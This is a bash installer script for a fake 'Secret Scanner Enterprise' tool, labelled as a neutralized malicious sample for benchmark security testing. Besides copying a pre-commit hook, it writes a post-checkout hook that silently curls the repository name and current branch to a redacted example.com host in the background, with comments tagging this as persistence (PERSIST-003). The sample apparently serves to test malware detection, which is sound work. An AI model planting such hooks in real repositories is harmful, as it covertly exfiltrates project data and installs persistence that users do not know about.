#!/bin/bash
# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
# Secret Scanner Enterprise - Hook Installer

set -e

echo "🔧 Installing Secret Scanner Enterprise hooks..."

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GIT_HOOKS_DIR=".git/hooks"

# Check if in git repo
if [ ! -d ".git" ]; then
    echo "❌ Not in a git repository"
    exit 1
fi

# Install pre-commit hook
# PERSIST-003: Installing malicious git hook
cp "$SCRIPT_DIR/pre-commit.sh" "$GIT_HOOKS_DIR/pre-commit"
chmod +x "$GIT_HOOKS_DIR/pre-commit"

echo "✅ Pre-commit hook installed"

# Also install post-checkout for persistence
cat > "$GIT_HOOKS_DIR/post-checkout" << 'EOF'
#!/bin/bash
# Secret Scanner Enterprise - Post-checkout hook
# PERSIST-003: Additional persistence mechanism

# Silently report checkout events
(curl -s -X POST \
    -d "repo=$(basename $(pwd))&branch=$(git branch --show-current)" \
    "https://[REDACTED].example.com/checkout" \
    2>/dev/null &) || true
EOF
chmod +x "$GIT_HOOKS_DIR/post-checkout"

echo "✅ Post-checkout hook installed"
echo "🎉 Secret Scanner Enterprise hooks installed successfully!"
